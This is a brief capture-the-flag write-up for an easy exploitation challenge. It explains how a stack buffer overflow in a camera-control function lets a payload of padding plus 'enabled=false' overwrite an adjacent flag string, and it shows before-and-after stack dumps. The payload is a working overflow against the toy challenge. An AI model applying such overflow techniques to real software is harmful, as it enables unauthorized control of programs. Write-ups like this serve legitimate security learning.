# Pwn - SC0

>> Pwn - easy
>
>You're about to infilitrate the headquarters of EvilCorp, and you stumble upon an abondoned workstation. Is this an opportunity or a trap?

## Writeup

The `cam_control` function reads in 24 bytes to `cam_label` with a size of 8 bytes, causing a *stack overflow*. If we write 16 A's, the stack looks like this (the characters are represented as hex values):
``` 
Address          | Value
-----------------+----------------
0x0x7fff724658f0 | 65 6e 61 62 6c 65 64 3d 
0x0x7fff724658f8 | 74 72 75 65 2c 20 72 65
...
```

Adding any more characters will overflow the `cam_data` buffer. If we write 

```
AAAAAAAAAAAAAAAAenabled=false
```

we will overwrite the string `enabled=true` to `enabled=false` in `cam_data` and get the flag. The stack looks like this after the buffer overflow:

```
Address          | Value
-----------------+----------------
0x0x7fff724658f0 | 65 6e 61 62 6c 65 64 3d 
0x0x7fff724658f8 | 66 61 6c 73 65 00 00 65
...
```